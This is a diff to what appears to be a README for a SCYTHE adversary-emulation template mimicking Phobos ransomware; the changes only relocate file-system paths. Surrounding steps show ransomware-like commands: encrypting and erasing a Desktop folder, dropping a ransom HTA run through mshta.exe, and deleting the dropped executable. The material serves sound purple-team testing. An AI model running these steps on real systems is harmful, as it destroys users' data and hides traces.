@@ -7,7 +7,7 @@ This threat is based on the BlackBerry blog post: https://blogs.blackberry.com/e
 
 1. Download and import the threat in JSON format to your SCYTHE instance 
 2. Download the Virtual File System (VFS) files under the VFS folder
-3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Phobos
+3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/Phobos
 4. Create a new campaign
 5. Import from Existing Threat: Phobos
 6. Launch Campaign
@@ -45,7 +45,7 @@ This threat is based on the BlackBerry blog post: https://blogs.blackberry.com/e
 27. crypt --target "%USERPROFILE%\Desktop\Phobos\" --encrypt --password "#RansomwareSucks" --erase
 28. file --create --path "%USERPROFILE%\Desktop\Phobos\encryptedfile.HORSEMONEY" --size 1MB --count 1 --random
 29. loader --load downloader
-30. downloader --src "VFS:/shared/Phobos/info.hta" --dest "%USERPROFILE%\Desktop\Phobos\info.hta"
+30. downloader --src "VFS:/shared/threats/Phobos/info.hta" --dest "%USERPROFILE%\Desktop\Phobos\info.hta"
 31. run mshta.exe "%USERPROFILE%\Desktop\Phobos\info.hta" &
 32. STEP = CLEANUP
 33. run cmd /c del "%LocalAppData%\horsemoney.exe"
